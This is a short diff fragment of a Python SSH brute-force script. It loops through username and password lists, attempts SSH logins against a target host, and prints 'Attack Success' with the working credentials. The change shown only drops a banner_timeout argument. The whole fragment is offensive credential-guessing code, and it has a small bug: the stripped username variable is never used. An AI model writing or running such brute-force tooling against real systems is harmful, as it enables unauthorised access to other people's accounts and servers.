@@ -16,7 +16,7 @@ with open(uname_file,'r') as uname_list:
 				unam = uname.strip('\n')
 				passwd = passwd.strip('\n')
 				try:
-					response = ssh(host=host,user=uname,password=passwd,port=int(ssh_port), timeout=5,banner_timeout=5)
+					response = ssh(host=host,user=uname,password=passwd,port=int(ssh_port), timeout=5)
 					print('[{}] Attepting Username: {} and Password: {}'.format(attempts,uname,passwd))
 					if response.connected():
 						print("Attack Success\nUsername: {} ,Password: {}".format(uname,passwd))
